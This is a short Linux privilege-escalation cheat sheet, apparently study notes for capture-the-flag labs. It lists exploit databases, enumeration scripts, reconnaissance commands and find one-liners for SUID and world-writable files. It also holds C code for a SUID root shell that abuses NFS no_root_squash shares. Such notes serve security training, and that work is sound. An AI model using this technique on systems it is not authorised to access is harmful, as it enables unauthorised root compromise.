
## Links

### Exploit DB
* https://nvd.nist.gov/
* https://www.exploit-db.com/
* https://www.rapid7.com/db/

### Lolbin 
* https://gtfobins.github.io/


## Enumeration tools
* LinPeas: https://github.com/carlospolop/* privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* LinEnum: https://github.com/rebootuser/LinEnum
* LES (Linux Exploit Suggester): https://github.com/mzet-/* linux-exploit-suggester
* Linux Smart Enumeration: https://github.com/diego-treitos/* linux-smart-enumeration
* Linux Priv Checker: https://github.com/linted/linuxprivchecker 

## Mount
If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

```
# cat foo.c
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0; 
}

# gcc foo.c -o foo

# chmod +x ./foo
# chmod +s ./foo
```


## Commands

```
hostname

uname -a

cat /proc/version

cat /etc/issue

ps

env

id

/etc/passwd

history

ifconfig

ip route

netstat -plunta

getcap -r / 2>/dev/null


bash -i  #force interactive shell

```

## Find

* ``find . -name flag1.txt``: find the file named “flag1.txt” in the current directory
* ``find /home -name flag1.txt``: find the file names “flag1.txt” in the /home directory
* ``find / -type d -name config``: find the directory named config under “/”
* ``find / -type f -perm 0777``: find files with the 777 permissions (files readable, writable, and executable by all users)
* ``find / -perm a=x``: find executable files
* ``find /home -user frank``: find all files for user “frank” under “/home”
* ``find / -mtime 10``: find files that were modified in the last 10 days
* ``find / -atime 10``: find files that were accessed in the last 10 day
* ``find / -cmin -60``: find files changed within the last hour (60 minutes)
* ``find / -amin -60``: find files accesses within the last hour (60 minutes)
* ``find / -size 50M``: find files with a 50 MB size

* ``find / -writable -type d 2>/dev/null`` : Find world-writeable folders
* ``find / -perm -222 -type d 2>/dev/null``: Find world-writeable folders
* ``find / -perm -o w -type d 2>/dev/null``: Find world-writeable folders
* ``find / -perm -o x -type d 2>/dev/null``:  Find world-executable folders
* ``find / -name perl*``
* ``find / -name python*``
* ``find / -name gcc*``
* ``find / -perm -u=s -type f 2>/dev/null`` Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
* ```find / -type f -perm -04000 -ls 2>/dev/null``` will list files that have SUID or SGID bits set.
